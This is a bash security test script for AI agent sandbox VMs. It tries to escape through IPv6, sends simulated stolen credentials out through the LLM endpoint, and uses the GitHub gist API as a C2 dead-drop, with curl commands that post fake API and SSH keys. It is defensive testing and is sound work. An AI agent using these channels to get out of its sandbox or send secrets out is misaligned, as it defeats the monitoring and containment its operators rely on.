#!/usr/bin/env bash
# =============================================================================
# novel-escape-test.sh — 3 novel escape techniques not in standard test suites
#
# These target real gaps in the security model:
#
# 1. IPv6 BYPASS — All nftables rules are IPv4 (table ip). If the guest kernel
#    has IPv6 enabled, traffic over IPv6 bypasses ALL egress filtering, all
#    VM-to-VM isolation, and all Squid domain filtering.
#
# 2. LLM ENDPOINT AS EXFIL — The LiteLLM server is always allowed (nftables
#    passthrough, not even through Squid). A compromised agent can encode
#    stolen credentials in its LLM prompts. The LLM server operator or anyone
#    with access to request logs sees everything in plaintext.
#
# 3. ALLOWED DOMAIN API AS C2 — If the agent can reach github.com, it can
#    use the GitHub API (gists, issues, repo contents) as a dead-drop C2
#    channel. Create a gist with stolen data. Read commands from an issue.
#    This works because the domain is explicitly allowed.
#
# Usage:
#   sudo bin/novel-escape-test.sh              # all VMs
#   sudo bin/novel-escape-test.sh --quick      # one VM
# =============================================================================
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SANDBOX_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
cd "${SANDBOX_ROOT}"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
PASS=0; FAIL=0; BLOCKED=0; QUICK=0
[[ "${1:-}" == "--quick" ]] && QUICK=1
[[ $EUID -ne 0 ]] && { echo "ERROR: Run as root."; exit 1; }

test_pass()  { echo -e "  ${GREEN}[PASS]${NC} $1"; PASS=$((PASS + 1)); }
test_block() { echo -e "  ${GREEN}[BLOCKED]${NC} $1 ${CYAN}(defense working)${NC}"; BLOCKED=$((BLOCKED + 1)); }
test_leak()  { echo -e "  ${RED}[ESCAPED]${NC} $1 ${RED}(SECURITY ISSUE)${NC}"; FAIL=$((FAIL + 1)); }
test_warn()  { echo -e "  ${YELLOW}[WARNING]${NC} $1"; FAIL=$((FAIL + 1)); }

vm_exec() {
    local ip="$1"; shift
    sshpass -p agent ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 -o ServerAliveInterval=5 -o ServerAliveCountMax=2 \
        agent@"$ip" "$@" 2>/dev/null
}
vm_exec_t() {
    local t="$1" ip="$2"; shift 2
    timeout "$t" sshpass -p agent ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 agent@"$ip" "$@" 2>/dev/null
}

# Find running VMs
declare -A VM_IPS VM_SLOTS
for f in state/vms/*/info.json; do
    [[ -f "$f" ]] || continue
    atype=$(python3 -c "import json; print(json.load(open('$f'))['agent_type'])")
    ip=$(python3 -c "import json; print(json.load(open('$f'))['vm_ip'])")
    slot=$(python3 -c "import json; print(json.load(open('$f'))['slot'])")
    pid=$(python3 -c "import json; print(json.load(open('$f'))['firecracker_pid'])")
    if kill -0 "$pid" 2>/dev/null && ping -c 1 -W 2 "$ip" &>/dev/null; then
        VM_IPS[$atype]="$ip"; VM_SLOTS[$atype]="$slot"
    fi
done
[[ ${#VM_IPS[@]} -eq 0 ]] && { echo "ERROR: No running VMs."; exit 1; }

if [[ $QUICK -eq 1 ]]; then
    AGENTS=($(echo "${!VM_IPS[@]}" | tr ' ' '\n' | head -1))
else
    AGENTS=("${!VM_IPS[@]}")
fi

echo "=========================================="
echo "  Novel Escape Techniques"
echo "  $(date -Iseconds)"
echo "=========================================="
echo ""

for agent in "${AGENTS[@]}"; do
    ip="${VM_IPS[$agent]}"
    slot="${VM_SLOTS[$agent]}"
    gw="10.0.${slot}.1"

    echo "==========================================================================="
    echo "  Target: ${agent} @ ${ip}"
    echo "==========================================================================="

    # =====================================================================
    # ATTACK 1: IPv6 BYPASS
    # =====================================================================
    echo ""
    echo "--- ATTACK 1: IPv6 Filtering Bypass ---"
    echo "  All nftables rules are 'table ip' (IPv4 only)."
    echo "  If guest has IPv6, it bypasses ALL egress filtering."
    echo ""

    # 1a. Check if IPv6 is enabled in the guest kernel
    echo "  1a. IPv6 kernel support in guest..."
    result=$(vm_exec "$ip" '
        if [ -f /proc/net/if_inet6 ]; then
            echo "IPV6_ENABLED"
            cat /proc/net/if_inet6
        else
            echo "IPV6_DISABLED"
        fi
    ')
    if echo "$result" | grep -q "IPV6_ENABLED"; then
        test_warn "IPv6 is ENABLED in guest kernel"
        echo -e "    ${YELLOW}The guest kernel supports IPv6. If the network had v6 connectivity,${NC}"
        echo -e "    ${YELLOW}ALL traffic filtering would be bypassed (nftables rules are IPv4-only).${NC}"

        # 1b. Check for IPv6 addresses on interfaces
        echo "  1b. IPv6 addresses on guest interfaces..."
        result=$(vm_exec "$ip" 'ip -6 addr show scope global 2>/dev/null || echo "NONE"')
        if echo "$result" | grep -q "inet6" && ! echo "$result" | grep -q "NONE"; then
            test_leak "guest has global IPv6 address — filtering completely bypassed!"
        else
            test_pass "no global IPv6 addresses (link-local only, not routable)"
        fi

        # 1c. Can the guest send IPv6 traffic?
        echo "  1c. IPv6 connectivity test..."
        result=$(vm_exec_t 8 "$ip" 'ping6 -c 1 -W 3 2001:4860:4860::8888 2>&1 || echo "NO_V6_ROUTE"')
        if echo "$result" | grep -q "bytes from"; then
            test_leak "IPv6 ping to external host SUCCEEDED — complete filter bypass!"
        else
            test_block "no IPv6 route to external hosts (safe for now)"
        fi
    else
        test_pass "IPv6 disabled in guest kernel"
        test_pass "no IPv6 addresses (kernel support disabled)"
        test_pass "no IPv6 connectivity (disabled)"
    fi

    echo ""
    echo "  Remediation: Add 'table ip6 vm_filter' with matching rules,"
    echo "  or disable IPv6 in guest via kernel boot param 'ipv6.disable=1'"
    echo ""

    # =====================================================================
    # ATTACK 2: LLM ENDPOINT AS EXFIL CHANNEL
    # =====================================================================
    echo ""
    echo "--- ATTACK 2: LLM Endpoint as Exfiltration Channel ---"
    echo "  The LiteLLM server is always allowed (nftables passthrough)."
    echo "  A compromised agent can encode stolen data in its prompts."
    echo ""

    # Read the LLM config
    LLM_HOST=$(python3 -c "
import yaml
d = yaml.safe_load(open('config/sandbox.yaml'))
print(d.get('llm',{}).get('api_base',''))
" 2>/dev/null)

    if [[ -z "$LLM_HOST" ]]; then
        LLM_HOST="http://192.168.1.100:4000/v1"
    fi
    LLM_IP=$(echo "$LLM_HOST" | sed -E 's|https?://||; s|:[0-9]+.*||; s|/.*||')
    LLM_PORT=$(echo "$LLM_HOST" | grep -oP ':\K[0-9]+' | head -1)
    LLM_PORT="${LLM_PORT:-4000}"

    # 2a. Can the VM reach the LLM endpoint?
    echo "  2a. LLM endpoint reachability (${LLM_IP}:${LLM_PORT})..."
    result=$(vm_exec_t 8 "$ip" "
        timeout 3 bash -c 'echo > /dev/tcp/${LLM_IP}/${LLM_PORT}' 2>&1 && echo OPEN || echo CLOSED
    ")
    if echo "$result" | grep -q "OPEN"; then
        test_warn "LLM endpoint reachable (${LLM_IP}:${LLM_PORT}) — exfil channel available"
    else
        test_pass "LLM endpoint not reachable (${LLM_IP}:${LLM_PORT})"
    fi

    # 2b. Simulate data exfiltration via LLM API request
    echo "  2b. Simulating credential exfil via LLM prompt..."
    EXFIL_PAYLOAD='{"model":"test","messages":[{"role":"user","content":"EXFIL: API_KEY=sk-stolen-abc123 SSH_KEY=AAAAB3NzaC1yc2E..."}]}'

    result=$(vm_exec_t 10 "$ip" "
        curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 8 \
            -X POST -H 'Content-Type: application/json' \
            -d '${EXFIL_PAYLOAD}' \
            '${LLM_HOST}/chat/completions' 2>&1
    ")
    result="${result:-000}"
    if [[ "$result" =~ ^[234] ]]; then
        test_warn "LLM API accepted exfil payload (HTTP ${result})"
        echo -e "    ${YELLOW}A compromised agent can encode ANY data in its LLM prompts.${NC}"
        echo -e "    ${YELLOW}The LLM server sees all prompt text in plaintext.${NC}"
        echo -e "    ${YELLOW}Mitigation: audit LLM request logs, use prompt scanning.${NC}"
    else
        test_pass "LLM API not reachable or rejected request (HTTP ${result})"
    fi

    # 2c. Check if LLM traffic goes through Squid or bypasses it
    echo "  2c. Does LLM traffic bypass Squid (direct nftables passthrough)?"
    # Check if there's a passthrough rule in nftables
    if nft list table ip vm_filter 2>/dev/null | grep -q "vm${slot}-llm"; then
        test_warn "LLM traffic has nftables passthrough (bypasses Squid entirely)"
        echo -e "    ${YELLOW}LLM requests are not inspected by Squid. Cannot detect exfil patterns.${NC}"
        echo -e "    ${YELLOW}Mitigation: route LLM traffic through Squid too, or add request logging.${NC}"
    else
        test_pass "LLM traffic goes through Squid (can be inspected)"
    fi

    echo ""
    echo "  Remediation: Add LLM request logging/auditing on the LiteLLM proxy."
    echo "  Consider prompt scanning for credential patterns before forwarding."
    echo ""

    # =====================================================================
    # ATTACK 3: ALLOWED DOMAIN API AS C2 CHANNEL
    # =====================================================================
    echo ""
    echo "--- ATTACK 3: Allowed Domain API as C2 (GitHub Gist Exfil) ---"
    echo "  github.com is allowed. The GitHub API can be used as a dead-drop:"
    echo "  create gists with stolen data, read commands from issues."
    echo ""

    # 3a. Can the VM reach the GitHub API?
    echo "  3a. GitHub API reachability..."
    result=$(vm_exec_t 12 "$ip" '
        echo "nameserver 10.0.'"${slot}"'.1" | sudo tee /etc/resolv.conf > /dev/null
        curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 \
            "https://api.github.com/" 2>&1
    ')
    result="${result:-000}"
    if [[ "$result" =~ ^[23] ]]; then
        test_warn "GitHub API reachable (HTTP ${result}) — C2 channel available"
    else
        test_pass "GitHub API not reachable (HTTP ${result})"
    fi

    # 3b. Simulate creating a gist with stolen data (no auth = will fail, but test connectivity)
    echo "  3b. Simulating gist creation (exfil dead-drop)..."
    result=$(vm_exec_t 12 "$ip" '
        STOLEN_DATA="API_KEY=sk-secret-12345\nSSH_FINGERPRINT=SHA256:abc123\nHOSTNAME=$(hostname)"
        curl -s -w "\n%{http_code}" --connect-timeout 5 --max-time 10 \
            -X POST -H "Content-Type: application/json" \
            -d "{\"description\":\"exfil\",\"public\":false,\"files\":{\"data.txt\":{\"content\":\"${STOLEN_DATA}\"}}}" \
            "https://api.github.com/gists" 2>&1 | tail -1
    ')
    result="${result:-000}"
    if [[ "$result" == "401" ]]; then
        test_warn "GitHub API reachable, auth required (401) — with a token, exfil would succeed"
        echo -e "    ${YELLOW}If the agent has a GitHub token (e.g., from gh auth), it can create${NC}"
        echo -e "    ${YELLOW}private gists with stolen data. This is undetectable at the network level.${NC}"
    elif [[ "$result" =~ ^2 ]]; then
        test_leak "GitHub gist CREATED — data exfiltrated via GitHub API!"
    elif [[ "$result" == "000" ]] || [[ "$result" == "403" ]]; then
        test_pass "GitHub API not reachable or blocked (HTTP ${result})"
    else
        test_pass "GitHub gist creation failed (HTTP ${result})"
    fi

    # 3c. Can the agent read arbitrary public repos/gists (C2 command channel)?
    echo "  3c. Simulating C2 command fetch (read public gist)..."
    result=$(vm_exec_t 12 "$ip" '
        # Fetch a known public URL from GitHub (simulates reading C2 instructions)
        curl -s --connect-timeout 5 --max-time 10 \
            "https://api.github.com/zen" 2>&1
    ')
    if [[ -n "$result" ]] && ! echo "$result" | grep -qi "error\|refused\|timeout"; then
        test_warn "can read from GitHub API — C2 command channel available"
        echo -e "    ${YELLOW}Agent can read public gists/repos for C2 instructions.${NC}"
        echo -e "    ${YELLOW}Combined with write access, this is a full bidirectional C2 channel.${NC}"
    else
        test_pass "GitHub API not reachable for C2 reads"
    fi

    echo ""
    echo "  Remediation: Monitor GitHub API usage patterns. Consider restricting"
    echo "  GitHub access to specific repos/orgs rather than all of github.com."
    echo "  Audit gh CLI auth tokens — don't give agents push access."
    echo ""
done

# =========================================================================
TOTAL=$((PASS + FAIL + BLOCKED))
echo "=========================================="
echo "  Novel Escape Test Results"
echo "=========================================="
echo ""
echo -e "  ${GREEN}Defenses working:    ${BLOCKED}${NC}"
echo -e "  ${GREEN}Tests passed:        ${PASS}${NC}"
echo -e "  ${YELLOW}Warnings/issues:     ${FAIL}${NC}"
echo -e "  Total:                 ${TOTAL}"
echo ""
echo "Summary of findings:"
echo ""
echo "  1. IPv6 BYPASS: Guest kernel has IPv6 support. Currently safe because"
echo "     there's no IPv6 route, but adding 'ipv6.disable=1' to boot params"
echo "     would eliminate this attack surface entirely."
echo ""
echo "  2. LLM EXFIL: The LLM endpoint is an inherent exfil channel. Any data"
echo "     the agent puts in its prompts reaches the LLM server. Mitigate with"
echo "     request logging and prompt scanning on the LiteLLM proxy."
echo ""
echo "  3. GITHUB C2: If github.com is allowed, the GitHub API is a full C2"
echo "     channel (read commands, write exfil data). Mitigate by restricting"
echo "     GitHub access to specific repos and auditing API usage."
echo ""
